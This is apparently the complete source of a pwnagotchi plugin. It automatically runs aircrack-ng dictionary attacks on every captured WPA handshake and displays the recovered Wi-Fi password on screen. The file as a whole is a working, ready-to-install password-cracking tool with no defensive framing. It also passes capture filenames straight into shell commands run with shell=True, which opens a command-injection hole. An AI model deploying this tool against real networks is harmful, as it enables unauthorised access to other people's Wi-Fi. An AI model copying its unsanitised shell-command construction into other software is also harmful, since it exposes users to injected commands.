import logging
import subprocess
import string
import re
import pwnagotchi.plugins as plugins

'''
Aircrack-ng needed, to install:
> apt-get install aircrack-ng
Upload wordlist files in .txt format to folder in config file (Default: /opt/wordlists/)
Cracked handshakes stored in handshake folder as [essid].pcap.cracked 
'''


class QuickDic(plugins.Plugin):
    __author__ = 'pwnagotchi [at] rossmarks [dot] uk'
    __version__ = '1.0.0'
    __license__ = 'GPL3'
    __description__ = 'Run a quick dictionary scan against captured handshakes'

    def __init__(self):
        self.text_to_set = ""

    def on_loaded(self):
        logging.info("Quick dictionary check plugin loaded")

    def on_handshake(self, agent, filename, access_point, client_station):
        display = agent.view()
        result = subprocess.run(('/usr/bin/aircrack-ng ' + filename + ' | grep "1 handshake" | awk \'{print $2}\''),
                                shell=True, stdout=subprocess.PIPE)
        result = result.stdout.decode('utf-8').translate({ord(c): None for c in string.whitespace})
        if not result:
            logging.info("[quickdic] No handshake")
        else:
            logging.info("[quickdic] Handshake confirmed")
            result2 = subprocess.run(('aircrack-ng -w `echo ' + self.options[
                'wordlist_folder'] + '*.txt | sed \'s/\ /,/g\'` -l ' + filename + '.cracked -q -b ' + result + ' ' + filename + ' | grep KEY'),
                                     shell=True, stdout=subprocess.PIPE)
            result2 = result2.stdout.decode('utf-8').strip()
            logging.info("[quickdic] " + result2)
            if result2 != "KEY NOT FOUND":
                key = re.search('\[(.*)\]', result2)
                pwd = str(key.group(1))
                self.text_to_set = "Cracked password: " + pwd
                display.update(force=True)

    def on_ui_update(self, ui):
        if self.text_to_set:
            ui.set('face', "(·ω·)")
            ui.set('status', self.text_to_set)
            self.text_to_set = ""
